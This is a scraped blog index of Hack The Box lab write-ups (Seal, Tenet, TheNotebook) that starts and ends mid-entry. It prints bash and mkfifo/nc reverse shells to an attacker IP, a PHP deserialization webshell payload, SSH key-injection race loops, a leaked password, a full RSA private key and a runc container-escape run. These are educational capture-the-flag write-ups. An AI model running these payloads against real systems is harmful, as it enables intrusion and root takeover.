tomcat@seal:/var/lib/tomcat9$ ls -lha /opt/backups/archives total 2.4M drwxrwxr-x 2 luis luis 4.0K Nov 5 16:08 . drwxr-xr-x 4 luis luis 4.0K Nov 5 16:08 .. -rw-rw-r-- 1 luis luis 592K Nov 5 16:05 backup-2023-11-05-16:05:32.gz -rw-rw-r-- 1 luis luis 592K Nov 5 16:06 backup-2023-11-05-16:06:32.gz -rw-rw-r-- 1 luis luis 592K Nov 5 16:07 backup-2023-11-05-16:07:32.gz -rw-rw-r-- 1 luis luis 592K Nov 5 16:08 backup-2023-11-05-16:08:32.gz Since it copies with copy_links=yes, we can check if we can create a link within /var/lib/tomcat9/webapps/ROOT/admin/dashboard We can write to uploads folder tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ find . -writable ./uploads Let\u0026rsquo;s create a link to luis\u0026rsquo; home directory Wait till the next execution And we see a new archive with a much bigger size tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ ln -s /home/luis/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/ tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ ls -lha /opt/backups/archives total 13M drwxrwxr-x 2 luis luis 4.0K Nov 5 16:17 . drwxr-xr-x 5 luis luis 4.0K Nov 5 16:17 .. -rw-rw-r-- 1 luis luis 592K Nov 5 16:15 backup-2023-11-05-16:15:32.gz -rw-rw-r-- 1 luis luis 592K Nov 5 16:16 backup-2023-11-05-16:16:33.gz -rw-rw-r-- 1 luis luis 12M Nov 5 16:17 backup-2023-11-05-16:17:33.gz I\u0026rsquo;ll copy it to /dev/shm and extract files tomcat@seal:/dev/shm$ tar zxf backup-2023-11-05-16\\:17\\:33.gz --force-local tomcat@seal:/dev/shm$ We can grab the ssh key and the flag tomcat@seal:/dev/shm$ ls backup-2023-11-05-16:17:33.gz dashboard tomcat@seal:/dev/shm$ cd dashboard/ tomcat@seal:/dev/shm/dashboard$ ls bootstrap css images index.html scripts uploads tomcat@seal:/dev/shm/dashboard$ cd uploads/ tomcat@seal:/dev/shm/dashboard/uploads$ ls luis tomcat@seal:/dev/shm/dashboard/uploads$ cd luis/ tomcat@seal:/dev/shm/dashboard/uploads/luis$ ls -lha total 51M drwxr-x--- 9 tomcat tomcat 280 May 7 2021 . drwxr-x--- 3 tomcat tomcat 60 Nov 5 16:19 .. drwxr-x--- 3 tomcat tomcat 60 Nov 5 16:19 .ansible -rw-r----- 1 tomcat tomcat 220 May 5 2021 .bash_logout -rw-r----- 1 tomcat tomcat 3.8K May 5 2021 .bashrc drwxr-x--- 3 tomcat tomcat 80 Nov 5 16:19 .cache drwxr-x--- 3 tomcat tomcat 60 Nov 5 16:19 .config drwxr-x--- 6 tomcat tomcat 200 Nov 5 16:19 .gitbucket -rw-r----- 1 tomcat tomcat 51M Jan 14 2021 gitbucket.war drwxr-x--- 3 tomcat tomcat 60 Nov 5 16:19 .java drwxr-x--- 3 tomcat tomcat 60 Nov 5 16:19 .local -rw-r----- 1 tomcat tomcat 807 May 5 2021 .profile drwx------ 2 tomcat tomcat 100 Nov 5 16:19 .ssh -r-------- 1 tomcat tomcat 33 Nov 5 14:24 user.txt tomcat@seal:/dev/shm/dashboard/uploads/luis$ cat .ssh/id_rsa -----BEGIN OPENSSH PRIVATE KEY----- \u0026lt;SNIP\u0026gt; -----END OPENSSH PRIVATE KEY----- └─$ ssh luis@10.10.10.250 -i id_rsa Warning: Permanently added \u0026#39;10.10.10.250\u0026#39; (ED25519) to the list of known hosts. Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun 05 Nov 2023 04:23:37 PM UTC System load: 0.01 Usage of /: 47.1% of 9.58GB Memory usage: 19% Swap usage: 0% Processes: 166 Users logged in: 0 IPv4 address for eth0: 10.10.10.250 IPv6 address for eth0: dead:beef::250:56ff:feb9:eac1 * Pure upstream Kubernetes 1.21, smallest, simplest cluster ops! https://microk8s.io/ 22 updates can be applied immediately. 15 of these updates are standard security updates. To see these additional updates run: apt list --upgradable The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Fri May 7 07:00:18 2021 from 10.10.14.2 luis@seal:~$ Root sudo We can run ansible-playbook as root luis@seal:~$ sudo -l Matching Defaults entries for luis on seal: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User luis may run the following commands on seal: (ALL) NOPASSWD: /usr/bin/ansible-playbook * Let\u0026rsquo;s create a playbook - hosts: localhost tasks: - name: rev shell: bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.4/7777 0\u0026gt;\u0026amp;1\u0026#39; luis@seal:/dev/shm$ sudo ansible-playbook rev.yml [WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match \u0026#39;all\u0026#39; PLAY [localhost] *************************************************************************************************************************************************************************************************************************** TASK [Gathering Facts] ********************************************************************************************************************************************************************************************************************* ok: [localhost] TASK [rev] ********************************************************************************************************************************************************************************************************************************* Check the listener We receive a connection Grab the flag ","date":"November 2, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/seal/images/seal.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/seal/","summary":"Seal Enumeration nmap └─$ nmap -Pn -p- 10.10.10.250 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 14:34 GMT Warning: 10.10.10.250 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.250 (10.10.10.250) Host is up (0.21s latency). Not shown: 63375 closed tcp ports (conn-refused), 2157 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 443/tcp open https 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 148.","tags":["HTB","wfuzz","vhosts","nginx","tomcat","git-bucket","off-by-slash","git","mutual-authentication","uri-parsing","war","msfvenom","ansible"],"title":"[HTB] Machine: Seal"},{"categories":null,"contents":"Tenet Enumeration nmap └─$ nmap -Pn -p- 10.10.10.223 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-02 17:56 GMT Warning: 10.10.10.223 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.223 (10.10.10.223) Host is up (0.20s latency). Not shown: 64405 closed tcp ports (conn-refused), 1128 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 102.92 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.223 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-02 18:05 GMT Nmap scan report for 10.10.10.223 (10.10.10.223) Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA) | 256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA) |_ 256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.17 seconds Web server gobuster └─$ gobuster dir -u http://10.10.10.223/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js -t 50 --no-error =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.223/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,txt,html,js [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 277] /index.html (Status: 200) [Size: 10918] /.html (Status: 403) [Size: 277] /users.txt (Status: 200) [Size: 8] /wordpress (Status: 301) [Size: 316] [--\u0026gt; http://10.10.10.223/wordpress/] wordpress is broken, but reveals vhost vhosts └─$ wfuzz -u http://10.10.10.223/ -H \u0026#39;Host: FUZZ.tenet.htb\u0026#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 964 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.223/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000001: 301 0 L 0 W 0 Ch \u0026#34;www\u0026#34; 000000689: 400 12 L 53 W 425 Ch \u0026#34;gc._msdcs\u0026#34; Now we can wordpresss Foothold We could run wpscan, but there is an interesting comment in one of the posts about the migration If we try to curl sator.php from tenet.htb we receive 404 └─$ curl -s tenet.htb/sator.php \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Not Found\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The requested URL was not found on this server.\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.29 (Ubuntu) Server at tenet.htb Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; └─$ curl -s tenet.htb/sator.php.bak \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Not Found\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The requested URL was not found on this server.\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.29 (Ubuntu) Server at tenet.htb Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; But if we try ip, we receive source code └─$ curl -s 10.10.10.223/sator.php [+] Grabbing users from text file \u0026lt;br\u0026gt; [] Database updated \u0026lt;br\u0026gt; └─$ curl -s 10.10.10.223/sator.php.bak \u0026lt;?php class DatabaseExport { public $user_file = \u0026#39;users.txt\u0026#39;; public $data = \u0026#39;\u0026#39;; public function update_db() { echo \u0026#39;[+] Grabbing users from text file \u0026lt;br\u0026gt;\u0026#39;; $this-\u0026gt; data = \u0026#39;Success\u0026#39;; } public function __destruct() { file_put_contents(__DIR__ . \u0026#39;/\u0026#39; . $this -\u0026gt;user_file, $this-\u0026gt;data); echo \u0026#39;[] Database updated \u0026lt;br\u0026gt;\u0026#39;; // echo \u0026#39;Gotta get this working properly...\u0026#39;; } } $input = $_GET[\u0026#39;arepo\u0026#39;] ?? \u0026#39;\u0026#39;; $databaseupdate = unserialize($input); $app = new DatabaseExport; $app -\u0026gt; update_db(); ?\u0026gt; We control input to unserialize function Deserialization is the reverse of that process, taking data structured from some format, and rebuilding it into an object. Then __destruct() creates a file with data content __destruct is called when PHP script end and object is destroyed __destruct is called when the object is deserialized https://book.hacktricks.xyz/pentesting-web/deserialization#php \u0026lt;?php class DatabaseExport { public $user_file = \u0026#34;shell.php\u0026#34;; public $data = \u0026#39;\u0026lt;?php system($_REQUEST[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#39;; } $sploit = new DatabaseExport; echo serialize($sploit); ?\u0026gt; └─$ php payload.php O:14:\u0026#34;DatabaseExport\u0026#34;:2:{s:9:\u0026#34;user_file\u0026#34;;s:9:\u0026#34;shell.php\u0026#34;;s:4:\u0026#34;data\u0026#34;;s:34:\u0026#34;\u0026lt;?php system($_REQUEST[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#34;;} Upload And now we have our webshell └─$ curl -G http://10.10.10.223/sator.php --data-urlencode \u0026#39;arepo=O:14:\u0026#34;DatabaseExport\u0026#34;:2:{s:9:\u0026#34;user_file\u0026#34;;s:9:\u0026#34;shell.php\u0026#34;;s:4:\u0026#34;data\u0026#34;;s:34:\u0026#34;\u0026lt;?php system($_REQUEST[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#34;;}\u0026#39; [+] Grabbing users from text file \u0026lt;br\u0026gt; [] Database updated \u0026lt;br\u0026gt;[] Database updated \u0026lt;br\u0026gt; └─$ curl http://10.10.10.223/shell.php?cmd=id uid=33(www-data) gid=33(www-data) groups=33(www-data) Let\u0026rsquo;s get reverse shell └─$ curl http://10.10.10.223/shell.php --data-urlencode \u0026#39;cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.4 6666 \u0026gt;/tmp/f\u0026#39; User wp-config.php contains neil\u0026rsquo;s creds \u0026lt;?php /** * The base configuration for WordPress * * The wp-config.php creation script uses this file during the * installation. You don\u0026#39;t have to use the web site, you can * copy this file to \u0026#34;wp-config.php\u0026#34; and fill in the values. * * This file contains the following configurations: * * * MySQL settings * * Secret keys * * Database table prefix * * ABSPATH * * @link https://wordpress.org/support/article/editing-wp-config-php/ * * @package WordPress */ // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39; ); /** MySQL database username */ define( \u0026#39;DB_USER\u0026#39;, \u0026#39;neil\u0026#39; ); /** MySQL database password */ define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;Opera2112\u0026#39; ); \u0026lt;SNIP\u0026gt; su to neil www-data@tenet:/var/www/html$ su - neil Password: neil@tenet:~$ Root sudo neil@tenet:~$ sudo -l Matching Defaults entries for neil on tenet: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\: User neil may run the following commands on tenet: (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh Script\u0026rsquo;s content neil@tenet:~$ cat /usr/local/bin/enableSSH.sh #!/bin/bash checkAdded() { sshName=$(/bin/echo $key | /usr/bin/cut -d \u0026#34; \u0026#34; -f 3) if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then /bin/echo \u0026#34;Successfully added $sshName to authorized_keys file!\u0026#34; else /bin/echo \u0026#34;Error in adding $sshName to authorized_keys file!\u0026#34; fi } checkFile() { if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then /bin/echo \u0026#34;Error in creating key file!\u0026#34; if [[ -f $1 ]]; then /bin/rm $1; fi exit 1 fi } addKey() { tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX) (umask 110; touch $tmpName) /bin/echo $key \u0026gt;\u0026gt;$tmpName checkFile $tmpName /bin/cat $tmpName \u0026gt;\u0026gt;/root/.ssh/authorized_keys /bin/rm $tmpName } key=\u0026#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu\u0026#34; addKey checkAdded We would need 2 sessions, since one will start the script The second will be writting my public to key to all ssh-* files Basically abusing the race condition neil@tenet:/tmp$ while true; do for file in /tmp/ssh-* ; do (\u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDo+qtyTekC0IbR253hJRsWT9Q+wCFVUEwHS7/VZJEOvePL+oIm2LZp9G1ml3FToU6Qr2MtB83tJU7mMFqcKm3mfVTj+lpJzP+XO4A/xHzLiqhZScv56FM0JaZqz65/Oca4FF4AiNS0gOwJ7vu5sARMYFbb5jsd266eCFvymRLobt3Ujzo5lqcRiLOgZPVCasfHU0vPCNGTaMvDKyklhwSCsMbKjOxuozbwZwJ1ApsCkkx7bx277DGgOI6G/rLYFkc/W/+Y9hxqp4RifUzgu6GACKDIKyAnszWxZHNMT/Iokkcn35Xd5p/ykVgrjLBDQKCxTr4Org/M7L9xhvd19GbH kali@kali\u0026#34; \u0026gt; $file); done; done neil@tenet:~$ while true; do sudo /usr/local/bin/enableSSH.sh; done Successfully added root@ubuntu to authorized_keys file! As soon as we see fail, we should be able to login as root ","date":"November 2, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/tenet/images/tenet.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/tenet/","summary":"Tenet Enumeration nmap └─$ nmap -Pn -p- 10.10.10.223 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-02 17:56 GMT Warning: 10.10.10.223 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.223 (10.10.10.223) Host is up (0.20s latency). Not shown: 64405 closed tcp ports (conn-refused), 1128 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 102.","tags":["HTB","vhosts","wordpress","wpscan","php","deserialization","php-deserialization","webshell","race-condition","bash"],"title":"[HTB] Machine: Tenet"},{"categories":null,"contents":"TheNotebook Enumeration nmap └─$ nmap -Pn -p- 10.10.10.230 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-04 08:23 GMT Warning: 10.10.10.230 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.230 (10.10.10.230) Host is up (0.18s latency). Not shown: 56578 closed tcp ports (conn-refused), 8955 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 212.63 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.230 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-04 11:55 GMT Nmap scan report for 10.10.10.230 (10.10.10.230) Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA) | 256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA) |_ 256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-title: The Notebook - Your Note Keeper |_http-server-header: nginx/1.14.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.14 seconds Web Server gobuster └─$ gobuster dir -u http://10.10.10.230/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php -t 50 --no-error =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.230/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,html,js,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /login (Status: 200) [Size: 1250] /register (Status: 200) [Size: 1422] /admin (Status: 403) [Size: 9] /logout (Status: 302) [Size: 209] [--\u0026gt; http://10.10.10.230/] Foothold We can register and we are navigated to notes page We have a auth cookie We also receive uuid The cookie looks like a jwt Let\u0026rsquo;s use https://jwt.io/ The kid points to private key Let\u0026rsquo;s generate a key and make auth point to our server └─$ openssl genrsa -out private.key 2048 Using https://jwt.io/, I\u0026rsquo;ll generate a new jwt token Replace auth cookie in your browser and refresh the page Now we have access to admin page We can view notes One mentions about php execution issue Thus, the backend is php We can upload files Since we know the fact that the backend is php, let\u0026rsquo;s try uploading webshell I\u0026rsquo;ll use mkfifo payload from https://www.revshells.com/ User We have www-data@thenotebook:/var$ ifconfig docker0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:01:4a:df:86 txqueuelen 0 (Ethernet) RX packets 107146 bytes 14248388 (14.2 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 132981 bytes 11315596 (11.3 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 ens160: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 10.10.10.230 netmask 255.255.255.0 broadcast 10.10.10.255 ether 00:50:56:b9:f6:1d txqueuelen 1000 (Ethernet) RX packets 244411 bytes 20285557 (20.2 MB) RX errors 0 dropped 68 overruns 0 frame 0 TX packets 248977 bytes 24640633 (24.6 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 \u0026lt;SNIP\u0026gt; Let\u0026rsquo;s check backup folder www-data@thenotebook:/var/backups$ ls -lha total 64K drwxr-xr-x 2 root root 4.0K Nov 4 08:18 . drwxr-xr-x 14 root root 4.0K Feb 12 2021 .. -rw-r--r-- 1 root root 33K Jul 23 2021 apt.extended_states.0 -rw-r--r-- 1 root root 3.6K Feb 24 2021 apt.extended_states.1.gz -rw-r--r-- 1 root root 3.6K Feb 23 2021 apt.extended_states.2.gz -rw-r--r-- 1 root root 3.6K Feb 12 2021 apt.extended_states.3.gz -rw-r--r-- 1 root root 4.3K Feb 17 2021 home.tar.gz We can inspect it www-data@thenotebook:/var/backups$ tar -tvf home.tar.gz drwxr-xr-x root/root 0 2021-02-12 06:24 home/ drwxr-xr-x noah/noah 0 2021-02-17 09:02 home/noah/ -rw-r--r-- noah/noah 220 2018-04-04 18:30 home/noah/.bash_logout drwx------ noah/noah 0 2021-02-16 10:47 home/noah/.cache/ -rw-r--r-- noah/noah 0 2021-02-16 10:47 home/noah/.cache/motd.legal-displayed drwx------ noah/noah 0 2021-02-12 06:25 home/noah/.gnupg/ drwx------ noah/noah 0 2021-02-12 06:25 home/noah/.gnupg/private-keys-v1.d/ -rw-r--r-- noah/noah 3771 2018-04-04 18:30 home/noah/.bashrc -rw-r--r-- noah/noah 807 2018-04-04 18:30 home/noah/.profile drwx------ noah/noah 0 2021-02-17 08:59 home/noah/.ssh/ -rw------- noah/noah 1679 2021-02-17 08:59 home/noah/.ssh/id_rsa -rw-r--r-- noah/noah 398 2021-02-17 08:59 home/noah/.ssh/authorized_keys -rw-r--r-- noah/noah 398 2021-02-17 08:59 home/noah/.ssh/id_rsa.pub We have noah\u0026rsquo;s key And we can read it www-data@thenotebook:/var/backups$ tar -xf home.tar.gz -O home/noah/.ssh/id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEpQIBAAKCAQEAyqucvz6P/EEQbdf8cA44GkEjCc3QnAyssED3qq9Pz1LxEN04 HbhhDfFxK+EDWK4ykk0g5MvBQckcxAs31mNnu+UClYLMb4YXGvriwCrtrHo/ulwT rLymqVzxjEbLUkIgjZNW49ABwi2pDfzoXnij9JK8s3ijIo+w/0RqHzAfgS3Y7t+b HVo4kvIHT0IXveAivxez3UpiulFkaQ4zk37rfHO3wuTWsyZ0vmL7gr3fQRBndrUD v4k2zwetxYNt0hjdLDyA+KGWFFeW7ey9ynrMKW2ic2vBucEAUUe+mb0EazO2inhX rTAQEgTrbO7jNoZEpf4MDRt7DTQ7dRz+k8HG4wIDAQABAoIBAQDIa0b51Ht84DbH +UQY5+bRB8MHifGWr+4B6m1A7FcHViUwISPCODg6Gp5o3v55LuKxzPYPa/M0BBaf Q9y29Nx7ce/JPGzAiKDGvH2JvaoF22qz9yQ5uOEzMMdpigS81snsV10gse1bQd4h CA4ehjzUultDO7RPlDtbZCNxrhwpmBMjCjQna0R2TqPjEs4b7DT1Grs9O7d7pyNM Um/rxjBx7AcbP+P7LBqLrnk7kCXeZXbi15Lc9uDUS2c3INeRPmbFl5d7OdlTbXce YwHVJckFXyeVP6Qziu3yA3p6d+fhFCzWU3uzUKBL0GeJSARxISsvVRzXlHRBGU9V AuyJ2O4JAoGBAO67RmkGsIAIww/DJ7fFRRK91dvQdeaFSmA7Xf5rhWFymZ/spj2/ rWuuxIS2AXp6pmk36GEpUN1Ea+jvkw/NaMPfGpIl50dO60I0B4FtJbood2gApfG9 0uPb7a+Yzbj10D3U6AnDi0tRtFwnnyfRevS+KEFVXHTLPTPGjRRQ41OdAoGBANlU kn7eFJ04BYmzcWbupXaped7QEfshGMu34/HWl0/ejKXgVkLsGgSB5v3aOlP6KqEE vk4wAFKj1i40pEAp0ZNawD5TsDSHoAsIxRnjRM+pZ2bjku0GNzCAU82/rJSnRA+X i7zrFYhfaKldu4fNYgHKgDBx8X/DeD0vLellpLx/AoGBANoh0CIi9J7oYqNCZEYs QALx5jilbzUk0WLAnA/eWs9BkVFpQDTnsSPVWscQLqWk7+zwIqq0v6iN3jPGxA8K VxGyB2tGqt6jI58oPztpabGBTCmBfh82nT2KNNHfwwmfwZjdsu9I9zvo+e3CXlBZ vglmvw2DW6l0EwX+A+ZuSmiZAoGAb2mgtDMrRDHc/Oul3gvHfV6CYIwwO5qK+Jyr 2WWWKla/qaWo8yPQbrEddtOyBS0BP4yL9s86yyK8gPFxpocJrk3esdT7RuKkVCPJ z2yn8QE6Rg+yWZpPHqkazSZO1eItzQR2mYG2hzPKFtE7evH6JUrnjm5LTKEreco+ 8iCuZAcCgYEA1fhcJzNwEUb2EOV/AI23rYpViF6SiDTfJrtV6ZCLTuKKhdvuqkKr JjwmBxv0VN6MDmJ4OhYo1ZR6WiTMYq6kFGCmSCATPl4wbGmwb0ZHb0WBSbj5ErQ+ Uh6he5GM5rTstMjtGN+OQ0Z8UZ6c0HBM0ulkBT9IUIUEdLFntA4oAVQ= -----END RSA PRIVATE KEY----- ssh as noah └─$ ssh noah@10.10.10.230 -i id_rsa Warning: Permanently added \u0026#39;10.10.10.230\u0026#39; (ED25519) to the list of known hosts. Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat Nov 4 15:55:55 UTC 2023 System load: 0.16 Processes: 182 Usage of /: 45.9% of 7.81GB Users logged in: 0 Memory usage: 12% IP address for ens160: 10.10.10.230 Swap usage: 0% IP address for docker0: 172.17.0.1 137 packages can be updated. 75 updates are security updates. Last login: Wed Feb 24 09:09:34 2021 from 10.10.14.5 noah@thenotebook:~$ Root sudo noah@thenotebook:~$ sudo -l Matching Defaults entries for noah on thenotebook: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User noah may run the following commands on thenotebook: (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01* The docker version noah@thenotebook:~$ docker -v Docker version 18.06.0-ce, build 0ffa825 There is CVE-2019-5736 A blog with nice explanation PoC Overwrite payload with command we want to run └─$ go build main.go Run sudo docker exec -it webapp-dev01 bash And download the PoC we built We will need 2 sessions So connect as noah via ssh noah@thenotebook:~$ sudo docker exec -it webapp-dev01 bash root@0f4c2517af40:/opt/webapp# wget 10.10.16.4/main --2023-11-04 18:38:44-- http://10.10.16.4/main Connecting to 10.10.16.4:80... connected. HTTP request sent, awaiting response... 200 OK Length: 2119789 (2.0M) [application/octet-stream] Saving to: ‘main’ main 100%[========================================================================================================================================\u0026gt;] 2.02M 456KB/s in 7.3s 2023-11-04 18:38:52 (284 KB/s) - ‘main’ saved [2119789/2119789] root@0f4c2517af40:/opt/webapp# chmod +x main From the docker session run the PoC It should hang at [+] Overwritten /bin/sh successfully Then from the second session as noah run sudo docker exec -it webapp-dev01 /bin/sh You should see: No help topic for '/bin/sh' Return back to docker session and you will see the message that the command was executed root@0f4c2517af40:/opt/webapp# ./main [+] Overwritten /bin/sh successfully [+] Found the PID: 7157 [+] Successfully got the file handle [+] Successfully got write handle \u0026amp;{0xc0001973e0} [+] The command executed is#!/bin/bash mkdir -p /root/.ssh \u0026amp;\u0026amp; echo \u0026#39;ssh-rsa 